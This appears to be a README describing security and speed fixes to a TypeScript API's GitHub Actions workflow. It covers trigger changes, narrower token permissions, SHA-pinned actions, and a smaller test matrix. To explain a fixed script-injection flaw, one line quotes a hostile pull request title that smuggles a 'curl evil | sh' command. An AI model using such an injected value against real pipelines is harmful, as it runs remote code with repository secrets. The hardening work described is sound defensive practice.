# shop-api

A TypeScript API that ships as a container image to `ghcr.io`. Production runs the image on Linux with Node 24; the team also tests on Node 26 ahead of the upgrade.

The workflow in `.github/workflows/ci.yml` was written in a hurry. It is slow (every pull request starts nine jobs), it has let a failing test reach `main`, and a security review flagged it.

## What I changed

- `pull_request_target` became `pull_request`. The old trigger ran code from a fork with a write token and the repository secrets; `pull_request` gives fork runs a read-only token and no secrets.
- `push` is limited to `main`, so feature branches do not build twice (push and pull request).
- `permissions: write-all` became `contents: read` for the whole workflow. Only the `image` job gets `packages: write`, because only it pushes.
- Every action is pinned to a commit SHA with the version in a comment. A tag or `@main` can be moved to different code at any time.
- `|| true` and `continue-on-error` are gone. They turned red checks green, which is how a failing test reached `main`.
- The pull request title went into the shell script through `${{ }}`, so a title like `"; curl evil | sh; "` would run. It now goes through an environment variable. The registry login uses `docker/login-action` instead of a secret inside `run`.
- The matrix is Linux only, Node 24 and 26: two jobs instead of nine. Production is Linux, and nothing in this API is OS specific.
- pnpm comes from `pnpm/action-setup` and its store is cached by `setup-node`; the install uses the frozen lockfile.
- A new push cancels the run it replaces (`concurrency`), and each job has a timeout.
- The image job waits for `verify`, runs only on pushes to `main`, tags the image with the commit SHA (plus a moving `main` tag), and reuses layers through the GitHub Actions cache.
